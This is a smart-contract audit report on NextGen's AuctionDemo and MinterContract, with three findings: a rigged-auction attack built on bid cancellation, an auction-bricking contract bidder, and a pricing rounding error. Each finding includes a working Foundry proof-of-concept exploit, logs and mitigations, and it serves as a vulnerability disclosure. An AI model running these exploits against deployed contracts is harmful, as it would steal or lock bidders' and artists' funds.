# [NextGen Report](https://code4rena.com/reports/2023-10-nextgen)

## Findings by Dimulski
| Severity | Title | 
|:--:|:--:|
| [H-01](#H-01) | Auction can be gamed by a malicious user | 
| [M-01](#M-01) | Auction can be bricked by a malicious user | 
| [M-02](#M-02) | Rounding down in getPrice() linear descending sale model leads to a loss of funds | 

## <a id='H-01'></a>[H-01] Auction can be gamed by a malicious user
## Lines of code
https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L104-L120

## Vulnerability details
## Impact
First consider the scenario where a similar NFT from the same collection can me minted for 1 ETH by a normal user by simply calling the mint() function in the MinterContract.sol contract. For example the sales model of the collection is Exponential Descending Sale and it has hit the Resting Price of 1 ETH. This attack works no matter the sales model of the collection, or the price of which an NFT can be bought for by simply minting it, it may only require adjusting the parameters. Once a malicious user (typically utilizing MEV bots, and private MEM pools) sees that an auction is created he can front run all other bids and first bid 1 WEI. Then create a second transaction and bid an astronomical amount for the NFT in order to deter all other participants from entering the auction, for the above scenario lets say 10 ETH. No normal user will want to pay more than 10 ETH for something that he can get for 1 ETH. One of the problems arises because in claimAuction() the require statement is require(block.timestamp >= minter.getAuctionEndTime(_tokenid) && ...) and in cancelBid() and cancelAllBids() is require(block.timestamp <= minter.getAuctionEndTime(_tokenid), "Auction ended"); . Even if the require statement in the cancelBid() and cancelAllBids() is change to require(block.timestamp < minter.getAuctionEndTime(_tokenid), "Auction ended"); the problem won't be fully mitigated because the malicious user can back run all the transactions in the block before block.timestamp is no longer less than minter.getAuctionEndTime(_tokenid) and execute the cancelBid() and thus withdraw his enormous bid, and win the auction for 1 WEI. The below POC utilizes the = in the require statements.

## Proof of Concept
To run the POC first follow the steps in this link: https://hardhat.org/hardhat-runner/docs/advanced/hardhat-and-foundry in order to add foundry to the project.

Create a AuditorTest.t.sol file in the test folder and add the following to it:

```solidity
pragma solidity 0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol"; 
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";
import {NextGenRandomizerNXT} from "../smart-contracts/RandomizerNXT.sol";
import {auctionDemo} from "../smart-contracts/AuctionDemo.sol";

contract AuditorTests  is Test {
    DelegationManagementContract public delegationManagementContract;
    randomPool public rPool;
    NextGenAdmins public nextGenAdmins;
    NextGenCore public nextGenCore;
    NextGenMinterContract public nextGenMinterContract;
    NextGenRandomizerNXT public nextGenRandomizerNXT;
    auctionDemo public aDemo;

    address public contractOwner = vm.addr(1);
    address public alice = vm.addr(2);
    address public bob = vm.addr(3);
    address public hacker = vm.addr(4);
    address public globalAdmin = vm.addr(5);
    address public collectionAdmin = vm.addr(6);
    address public functionAdmin = vm.addr(7);
    address public john = vm.addr(8);
    address public auctionNftOwner = vm.addr(9);
    address public delAddress = address(0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B);
    bytes32 public merkleRoot = 0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870;

    function setUp() public {
        vm.startPrank(contractOwner);
        /// INFO: Deploy contracts
        delegationManagementContract = new DelegationManagementContract();
        rPool = new randomPool();
        nextGenAdmins = new NextGenAdmins();
        nextGenCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(nextGenAdmins));
        nextGenMinterContract = new NextGenMinterContract(address(nextGenCore), address(delegationManagementContract), address(nextGenAdmins));
        nextGenRandomizerNXT = new NextGenRandomizerNXT(address(rPool), address(nextGenAdmins), address(nextGenCore));

        /// INFO: Set admins
        nextGenAdmins.registerAdmin(globalAdmin, true);
        nextGenAdmins.registerCollectionAdmin(1, collectionAdmin, true);
        nextGenAdmins.registerCollectionAdmin(2, collectionAdmin, true);
        vm.stopPrank();

        /// INFO: Set up collection in genCore
        vm.startPrank(globalAdmin);
        string[] memory collectionScript = new string[](1);
        collectionScript[0] = "desc";
        nextGenCore.createCollection("Test Collection 1", "Artist 1", "For testing", "www.test.com", "CCO", "https://ipfs.io/ipfs/hash/", "", collectionScript);
        nextGenCore.createCollection("Test Collection 2", "Artist 2", "For testing", "www.test.com", "CCO", "https://ipfs.io/ipfs/hash/", "", collectionScript);
        nextGenCore.addRandomizer(1, address(nextGenRandomizerNXT));
        nextGenCore.addRandomizer(2, address(nextGenRandomizerNXT));
        nextGenCore.addMinterContract(address(nextGenMinterContract));
        vm.stopPrank();

        /// INFO: Set up collection params in minter contract
        vm.startPrank(collectionAdmin);
        /// INFO: Set up collection 1
        nextGenCore.setCollectionData(1, collectionAdmin, 2, 10000, 1000);
        nextGenMinterContract.setCollectionCosts(
          1, // _collectionID
          1 ether, // _collectionMintCost 1 eth
          0, // _collectionEndMintCost 0.1 eth
          10, // _rate
          200, // _timePeriod
          3, // _salesOptions
          delAddress // delAddress
        );
        
        nextGenMinterContract.setCollectionPhases(
          1, // _collectionID
          201, // _allowlistStartTime
          400, // _allowlistEndTime
          401, // _publicStartTime
          2000, // _publicEndTime
          merkleRoot // _merkleRoot
        );

        /// INFO: Set up collection 2 playing the role of the burn collection
        nextGenCore.setCollectionData(2, collectionAdmin, 2, 10000, 1000);
        nextGenMinterContract.setCollectionCosts(
          2, // _collectionID
          1 ether, // _collectionMintCost 1 eth
          0, // _collectionEndMintCost 0.1 eth
          10, // _rate
          20, // _timePeriod
          3, // _salesOptions
          delAddress // delAddress
        );
        
        nextGenMinterContract.setCollectionPhases(
          2, // _collectionID
          21, // _allowlistStartTime
          100, // _allowlistEndTime
          200, // _publicStartTime
          500, // _publicEndTime
          merkleRoot // _merkleRoot
        );
        vm.stopPrank();

        /// INFO: intilialize burn
        vm.startPrank(globalAdmin);
        nextGenMinterContract.initializeBurn(2, 1, true);
        vm.stopPrank();

        /// INFO: Deploy AuctionDemo contract and approve contract to transfer NFTs
        vm.startPrank(auctionNftOwner);
        aDemo = new auctionDemo(address(nextGenMinterContract), address(nextGenCore), address(nextGenAdmins));
        nextGenCore.setApprovalForAll(address(aDemo), true);
        vm.stopPrank();
    }


    function test_RigAuctionDemo() public {
      /// INFO: Set up Auction Demo contract
      skip(401);
      vm.startPrank(globalAdmin);
      string memory tokenData = "{'tdh': '100'}";
      nextGenMinterContract.mintAndAuction(auctionNftOwner, tokenData, 2, 1, 500);
      vm.stopPrank();

      vm.startPrank(hacker);
      vm.deal(hacker, 11 ether);
      aDemo.participateToAuction{value: 1}(10_000_000_000);
      console.log("First 1 WEI bid: ", aDemo.returnHighestBid(10_000_000_000));
      console.log("Address of highest bidder: ", aDemo.returnHighestBidder(10_000_000_000));

      /// INFO: Malicious actor bids an astronomical amount for the NFT in order to deter all other participants from entering the auction
      aDemo.participateToAuction{value: 10 ether}(10_000_000_000);
      console.log("Bid 10 ETH: ", aDemo.returnHighestBid(10_000_000_000));
      console.log("Address of highest bidder: ", aDemo.returnHighestBidder(10_000_000_000));

      /// INFO: When auctionEndTime == block.timestamp
      aDemo.cancelBid(10_000_000_000, 1);
      skip(98);
      console.log("Highest bid should be 1 WEI: ", aDemo.returnHighestBid(10_000_000_000));
      console.log("Address of highest bidder: ", aDemo.returnHighestBidder(10_000_000_000));
      console.log("This is the current block.timestamp: ", block.timestamp);
      console.log("This is the auction endTime: ", nextGenMinterContract.getAuctionEndTime(10_000_000_000));
      aDemo.claimAuction(10_000_000_000);
      console.log("Balance of hacker: ", hacker.balance);
      assertEq(hacker, nextGenCore.ownerOf(10_000_000_000));
      vm.stopPrank();
    }
}
```

```solidity
Logs:
  First 1 WEI bid:  1
  Address of highest bidder:  0x1efF47bc3a10a45D4B230B5d10E37751FE6AA718
  Bid 10 ETH:  10000000000000000000
  Address of highest bidder:  0x1efF47bc3a10a45D4B230B5d10E37751FE6AA718
  Highest bid should be 1 WEI:  1
  Address of highest bidder:  0x1efF47bc3a10a45D4B230B5d10E37751FE6AA718
  This is the current block.timestamp:  500
  This is the auction endTime:  500
  Balance of hacker:  10999999999999999999
```

To run the test use: forge test -vvv --mt test_RigAuctionDemo

## Tools Used
Manual Review & Foundry

## Recommended Mitigation Steps
Consider changing the way you track user bids, instead of recording each bid separately, accumulate them for the same user.

## Assessed type
Other


## <a id='M-01'></a>[M-01] Auction can be bricked by a malicious user   
## Lines of code
https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L104-L120

## Impact
The claimAuction() function in the AuctionDemo.sol contract can be bricked by malicious user resulting in all funds being locked in the AuctionDemo.sol contract. A malicious user can just create a simple contract and use it to win the bidding. He can wait for the last seconds and place a bid that is bigger than the previous with just one wei. The problem comes because within claimAuction() IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid); . SafeTransferFrom checks if the highestBidder is a contract. If highestBidder is a contract in order to receive the NFT it has to implement the following functio

```solidity
 function onERC721Received(
       address operator,  
       address from, 
       uint256 tokenId, 
       bytes calldata data
     ) external returns (bytes4){
        return IERC721Receiver.onERC721Received.selector;
    });
```
Simply creating a contract that doesn't have this function and winning the auction with said contract, will result in the claimAuction() reverting. I have chosen the High severity because all bidders will lose their funds, and additionally the protocol team has specified the following invariant: "The highest bidder will receive the token after an auction finishes, the owner of the token will receive the funds and all other participants will get refunded."

## Proof of Concept
To run the POC first follow the steps in this link: https://hardhat.org/hardhat-runner/docs/advanced/hardhat-and-foundry in order to add foundry to the project.

Create a AuditorTests.t.sol file in the test folder and add the following to it:

```solidity
pragma solidity 0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol"; 
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";
import {NextGenRandomizerNXT} from "../smart-contracts/RandomizerNXT.sol";
import {BrickContract} from "./BrickContract.sol";
import {auctionDemo} from "../smart-contracts/AuctionDemo.sol";

contract AuditorTests  is Test {
    DelegationManagementContract public delegationManagementContract;
    randomPool public rPool;
    NextGenAdmins public nextGenAdmins;
    NextGenCore public nextGenCore;
    NextGenMinterContract public nextGenMinterContract;
    NextGenRandomizerNXT public nextGenRandomizerNXT;
    BrickContract public brickContract;
    auctionDemo public aDemo;

    address public contractOwner = vm.addr(1);
    address public alice = vm.addr(2);
    address public bob = vm.addr(3);
    address public hacker = vm.addr(4);
    address public globalAdmin = vm.addr(5);
    address public collectionAdmin = vm.addr(6);
    address public functionAdmin = vm.addr(7);
    address public john = vm.addr(8);
    address public auctionNftOwner = vm.addr(9);
    address public tom = vm.addr(10);
    address public delAddress = address(0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B);
    bytes32 public merkleRoot = 0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870;

    function setUp() public {
        vm.startPrank(contractOwner);
        /// INFO: Deploy contracts
        delegationManagementContract = new DelegationManagementContract();
        rPool = new randomPool();
        nextGenAdmins = new NextGenAdmins();
        nextGenCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(nextGenAdmins));
        nextGenMinterContract = new NextGenMinterContract(address(nextGenCore), address(delegationManagementContract), address(nextGenAdmins));
        nextGenRandomizerNXT = new NextGenRandomizerNXT(address(rPool), address(nextGenAdmins), address(nextGenCore));

        /// INFO: Set admins
        nextGenAdmins.registerAdmin(globalAdmin, true);
        nextGenAdmins.registerCollectionAdmin(1, collectionAdmin, true);
        nextGenAdmins.registerCollectionAdmin(2, collectionAdmin, true);
        vm.stopPrank();

        /// INFO: Set up collection in genCore
        vm.startPrank(globalAdmin);
        string[] memory collectionScript = new string[](1);
        collectionScript[0] = "desc";
        nextGenCore.createCollection("Test Collection 1", "Artist 1", "For testing", "www.test.com", "CCO", "https://ipfs.io/ipfs/hash/", "", collectionScript);
        nextGenCore.createCollection("Test Collection 2", "Artist 2", "For testing", "www.test.com", "CCO", "https://ipfs.io/ipfs/hash/", "", collectionScript);
        nextGenCore.addRandomizer(1, address(nextGenRandomizerNXT));
        nextGenCore.addRandomizer(2, address(nextGenRandomizerNXT));
        nextGenCore.addMinterContract(address(nextGenMinterContract));
        vm.stopPrank();

        /// INFO: Set up collection params in minter contract
        vm.startPrank(collectionAdmin);
        /// INFO: Set up collection 1
        nextGenCore.setCollectionData(1, collectionAdmin, 2, 10000, 1000);
        nextGenMinterContract.setCollectionCosts(
          1, // _collectionID
          1 ether, // _collectionMintCost 1 eth
          0, // _collectionEndMintCost 0.1 eth
          10, // _rate
          200, // _timePeriod
          3, // _salesOptions
          delAddress // delAddress
        );
        
        nextGenMinterContract.setCollectionPhases(
          1, // _collectionID
          201, // _allowlistStartTime
          400, // _allowlistEndTime
          401, // _publicStartTime
          2000, // _publicEndTime
          merkleRoot // _merkleRoot
        );

        /// INFO: Set up collection 2 playing the role of the burn collection
        nextGenCore.setCollectionData(2, collectionAdmin, 2, 10000, 1000);
        nextGenMinterContract.setCollectionCosts(
          2, // _collectionID
          1 ether, // _collectionMintCost 1 eth
          0, // _collectionEndMintCost 0.1 eth
          10, // _rate
          20, // _timePeriod
          3, // _salesOptions
          delAddress // delAddress
        );
        
        nextGenMinterContract.setCollectionPhases(
          2, // _collectionID
          21, // _allowlistStartTime
          100, // _allowlistEndTime
          200, // _publicStartTime
          500, // _publicEndTime
          merkleRoot // _merkleRoot
        );
        vm.stopPrank();

        /// INFO: intilialize burn
        vm.startPrank(globalAdmin);
        nextGenMinterContract.initializeBurn(2, 1, true);
        vm.stopPrank();

        /// INFO: Deploy AuctionDemo contract and approve contract to transfer NFTs
        vm.startPrank(auctionNftOwner);
        aDemo = new auctionDemo(address(nextGenMinterContract), address(nextGenCore), address(nextGenAdmins));
        nextGenCore.setApprovalForAll(address(aDemo), true);
        vm.stopPrank();
    }


    function test_BrickAuctionDemo() public {
        /// INFO: Set up Auction Demo contract
        skip(401);
        vm.startPrank(globalAdmin);
        string memory tokenData = "{'tdh': '100'}";
        nextGenMinterContract.mintAndAuction(auctionNftOwner, tokenData, 2, 1, 500);
        vm.stopPrank();

        /// INFO: Alice bids 5 ether
        vm.startPrank(alice);
        vm.deal(alice, 5 ether);
        aDemo.participateToAuction{value: 5 ether}(10_000_000_000);
        vm.stopPrank();
        
        /// INFO: Bob bids 6 ether
        vm.startPrank(bob);
        vm.deal(bob, 6 ether);
        aDemo.participateToAuction{value: 6 ether}(10000000000);
        vm.stopPrank();

        /// INFO: John bids 5 ether
        vm.startPrank(john);
        vm.deal(john, 7 ether);
        aDemo.participateToAuction{value: 7 ether}(10000000000);
        vm.stopPrank();

        vm.startPrank(hacker);
        vm.deal(hacker, 8 ether);
        brickContract = new BrickContract(address(aDemo));
        brickContract.bid{value: 7000000000000000001}(10000000000);
        skip(101);
        console.log("This is the brickContract address: ", address(brickContract));
        console.log("This is the highest bidder: ", aDemo.returnHighestBidder(10000000000));
        vm.expectRevert();
        aDemo.claimAuction(10000000000);
        console.log("AuctionDemo contract balance after all bids and claim: ", address(aDemo).balance);
        vm.stopPrank();

        vm.startPrank(alice);
        console.log("Alice balance: ", alice.balance);
        vm.expectRevert();
        aDemo.cancelBid(10000000000, 0);
        console.log("Alice balance: ", alice.balance);
        vm.stopPrank();
    }
}
```
```solidity
Logs:
  This is the brickContract address:  0x060cc26038E69D73552679103271eCA6E37D4CE6
  This is the highest bidder:  0x060cc26038E69D73552679103271eCA6E37D4CE6
  AuctionDemo contract balance after all bids and claim:  25000000000000000001
  Alice balance:  0
  Alice balance:  0
```
Create a file named BrickContract.sol in the test folder and add the following to it

```solidity
pragma solidity 0.8.19;

import {auctionDemo} from "../smart-contracts/AuctionDemo.sol";

contract BrickContract {
    auctionDemo public aDemo;

    constructor(address _aDemo) {
        aDemo = auctionDemo(_aDemo);
    }

    function bid(uint256 _nftId) public payable {
        aDemo.participateToAuction{value: msg.value}(_nftId);
    }
}
```

To run the test use: forge test -vvv --mt test_BrickAuctionDemo

## Tools Used
Foundry & Manual review

## Recommended Mitigation Steps
Consider adding separate functions where the other bidders can withdraw the amount they have bid after the Auction is completed, as well as add such function for the NFT owner that put their NFT for an auction, so he can withdraw his earnings. Consider utilizing the Pull over Push pattern https://fravoll.github.io/solidity-patterns/pull_over_push.html
## Assessed type
Token-Transfer

## <a id='M-02'></a>[M-02] Rounding down in getPrice() linear descending sale model leads to a loss of funds 
## Lines of code
https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L540-L564

## Vulnerability details
## Impact
When a collection is using a linear descending sale model the last period will return a lower price than expected. When setCollectionCosts() is set with the following parameters for example:

```solidity
  nextGenMinterContract.setCollectionCosts(
          1, // _collectionID
          4.1e18, // _collectionMintCost 4.1 eth - Starting Price
          3e18, // _collectionEndMintCost 3 eth - Resting Price
          0.2e18, // _rate
          600, // _timePeriod
          2, // _salesOptions
          delAddress // delAddress
        );
```
The problem comes in the following line:
if (((collectionPhases[_collectionId].collectionMintCost - collectionPhases[_collectionId].collectionEndMintCost) / (collectionPhases[_collectionId].rate)) > tDiff) . In Solidity, division rounds towards zero. As shown in the example parameters above if collectionMintCost is 4.1e18, collectionEndMintCost is 3e18 and the rate is 0.2e18, the left part of the if statement will try to divide 1.1e18 with 0.2e18 resulting in 5. Accordign to the docs: At each time period (which can vary), the minting cost decreases linearly until it reaches its resting price (ending minting cost) and stays there until the end of the minting phase. When the left side of the if statement is compared to tDiff, which shows how many periods have passed since the start of the sale in the last period of the sale, the check won't pass and will directly return the collectionEndMintCost price, which is lower than the expected price for the period. When a user pays less for an NFT the MinterContract.sol receives less ETH than it is expected by the artist of the collection and the team. As the payArtist() function distributes the funds generated by a certain collection to addresses supplied by the artist and the team of nextgen. This results in a loss for both the artist of the collection and the nextgen team. The supplied values are not a single magic combination that leads to this issue, there are a lot of possible combinations. As stated in the docs a period can be a minute, hour or a day. In the scenario where users are allowed to mint NFTs for a day on a discounted price the losses for the protocol will be big. This can happen in a lot of collections utilizing the linear descending sale model thus the high severity. In the below POC the parameters set in setCollectionCosts() are chosen for simplicity and close representation of the parameters provided in the docs for the linear descending sale model. As can be seen from the Logs the price in the 6th period is supposed to be 3.1e18 but in realty is 3e18 .

Note:
This is a completely different issue than the known issue presented by the team in the docs as this issue pertains to the linear descending sale model and is not concerned with a low minting cost: We are aware of the price rounding errors when the Exponential Descending Sales Model is used and the minting cost is low, thus any finding on this is not valid.

## Proof of Concept
To run the POC first follow the steps in this link: https://hardhat.org/hardhat-runner/docs/advanced/hardhat-and-foundry in order to add foundry to the project.

Create a AuditorPriceTests.t.sol file in the test folder and add the following to il

```solidity
pragma solidity 0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {DelegationManagementContract} from "../smart-contracts/NFTdelegation.sol"; 
import {randomPool} from "../smart-contracts/XRandoms.sol";
import {NextGenAdmins} from "../smart-contracts/NextGenAdmins.sol";
import {NextGenCore} from "../smart-contracts/NextGenCore.sol";
import {NextGenMinterContract} from "../smart-contracts/MinterContract.sol";
import {NextGenRandomizerNXT} from "../smart-contracts/RandomizerNXT.sol";
import {auctionDemo} from "../smart-contracts/AuctionDemo.sol";
import {ReentrancyAuctionDemo} from "./ReentrancyAuctionDemo.sol";

contract AuditorPriceTests  is Test {
    DelegationManagementContract public delegationManagementContract;
    randomPool public rPool;
    NextGenAdmins public nextGenAdmins;
    NextGenCore public nextGenCore;
    NextGenMinterContract public nextGenMinterContract;
    NextGenRandomizerNXT public nextGenRandomizerNXT;
    auctionDemo public aDemo;
    ReentrancyAuctionDemo public reentrancyAuctionDemo;

    address public contractOwner = vm.addr(1);
    address public alice = vm.addr(2);
    address public bob = vm.addr(3);
    address public hacker = vm.addr(4);
    address public globalAdmin = vm.addr(5);
    address public collectionAdmin = vm.addr(6);
    address public functionAdmin = vm.addr(7);
    address public john = vm.addr(8);
    address public auctionNftOwner = vm.addr(9);
    address public tom = vm.addr(10);
    address public delAddress = address(0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B);
    bytes32 public merkleRoot = 0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870;

    function setUp() public {
        vm.startPrank(contractOwner);
        /// INFO: Deploy contracts
        delegationManagementContract = new DelegationManagementContract();
        rPool = new randomPool();
        nextGenAdmins = new NextGenAdmins();
        nextGenCore = new NextGenCore("Next Gen Core", "NEXTGEN", address(nextGenAdmins));
        nextGenMinterContract = new NextGenMinterContract(address(nextGenCore), address(delegationManagementContract), address(nextGenAdmins));
        nextGenRandomizerNXT = new NextGenRandomizerNXT(address(rPool), address(nextGenAdmins), address(nextGenCore));

        /// INFO: Set admins
        nextGenAdmins.registerAdmin(globalAdmin, true);
        nextGenAdmins.registerCollectionAdmin(1, collectionAdmin, true);
        nextGenAdmins.registerCollectionAdmin(2, collectionAdmin, true);
        vm.stopPrank();

        /// INFO: Set up collection in genCore
        vm.startPrank(globalAdmin);
        string[] memory collectionScript = new string[](1);
        collectionScript[0] = "desc";
        nextGenCore.createCollection("Test Collection 1", "Artist 1", "For testing", "www.test.com", "CCO", "https://ipfs.io/ipfs/hash/", "", collectionScript);
        nextGenCore.addRandomizer(1, address(nextGenRandomizerNXT));
        nextGenCore.addMinterContract(address(nextGenMinterContract));
        vm.stopPrank();

        /// INFO: Set up collection params in minter contract
        vm.startPrank(collectionAdmin);
        /// INFO: Set up collection 1
        nextGenCore.setCollectionData(1, collectionAdmin, 2, 10000, 1000);
        nextGenMinterContract.setCollectionCosts(
          1, // _collectionID
          4.1e18, // _collectionMintCost 4.1 eth - Starting Price
          3e18, // _collectionEndMintCost 3 eth - Resting Price
          0.2e18, // _rate
          600, // _timePeriod
          2, // _salesOptions
          delAddress // delAddress
        );
        
        nextGenMinterContract.setCollectionPhases(
          1, // _collectionID
          600, // _allowlistStartTime
          600, // _allowlistEndTime
          600, // _publicStartTime
          6000, // _publicEndTime
          merkleRoot // _merkleRoot
        );

        /// INFO: Deploy AuctionDemo contract and approve contract to transfer NFTs
        vm.startPrank(auctionNftOwner);
        aDemo = new auctionDemo(address(nextGenMinterContract), address(nextGenCore), address(nextGenAdmins));
        nextGenCore.setApprovalForAll(address(aDemo), true);
        vm.stopPrank();
    }

    function test_RoundingDownInLinearDescending() public {
        skip(600);
        console.log("This is the current block timestamp: ", block.timestamp);
        console.log("Get the price to mint for a collection with linear descending: ", nextGenMinterContract.getPrice(1));
        skip(600);
        console.log("This is the current block timestamp: ", block.timestamp);
        console.log("Get the price to mint for a collection with linear descending: ", nextGenMinterContract.getPrice(1));
        skip(600);
        console.log("This is the current block timestamp: ", block.timestamp);
        console.log("Get the price to mint for a collection with linear descending: ", nextGenMinterContract.getPrice(1));
        skip(600);
        console.log("This is the current block timestamp: ", block.timestamp);
        console.log("Get the price to mint for a collection with linear descending: ", nextGenMinterContract.getPrice(1));
        skip(600);
        console.log("This is the current block timestamp: ", block.timestamp);
        console.log("Get the price to mint for a collection with linear descending: ", nextGenMinterContract.getPrice(1));
        skip(600);
        console.log("This is the current block timestamp: ", block.timestamp);
        console.log("Get the price to mint for a collection with linear descending: ", nextGenMinterContract.getPrice(1));

        /// INFO: Alice mints an NFT cheaper than she should resulting in the protocol loosing money
        vm.startPrank(alice);
        vm.deal(alice, 3e18);
        bytes32[] memory merkleProof = new bytes32[](1);
        merkleProof[0] = merkleRoot;
        nextGenMinterContract.mint{value: 3e18}(1, 1, 1, "{'tdh': '100'}", alice, merkleProof, alice, 2);
        assertEq(alice.balance, 0);
        assertEq(alice, nextGenCore.ownerOf(10_000_000_000));
        vm.stopPrank();
    }
}
```
```solidity
Logs:
  This is the current block timestamp:  601
  Get the price to mint for a collection with linear descending:  4100000000000000000
  This is the current block timestamp:  1201
  Get the price to mint for a collection with linear descending:  3900000000000000000
  This is the current block timestamp:  1801
  Get the price to mint for a collection with linear descending:  3700000000000000000
  This is the current block timestamp:  2401
  Get the price to mint for a collection with linear descending:  3500000000000000000
  This is the current block timestamp:  3001
  Get the price to mint for a collection with linear descending:  3300000000000000000
  This is the current block timestamp:  3601
  Get the price to mint for a collection with linear descending:  30000000000000000000
```
To run the test use the following command: forge test -vvv --mt test_RoundingDownInLinearDescending


## Tools Used
Manual review & Foundry

## Recommended Mitigation Steps
Consider rounding up the results of the left side of the if statement if (((collectionPhases[_collectionId].collectionMintCost - collectionPhases[_collectionId].collectionEndMintCost) / (collectionPhases[_collectionId].rate)) > tDiff) or using => instead of >.

## Assessed type
Math
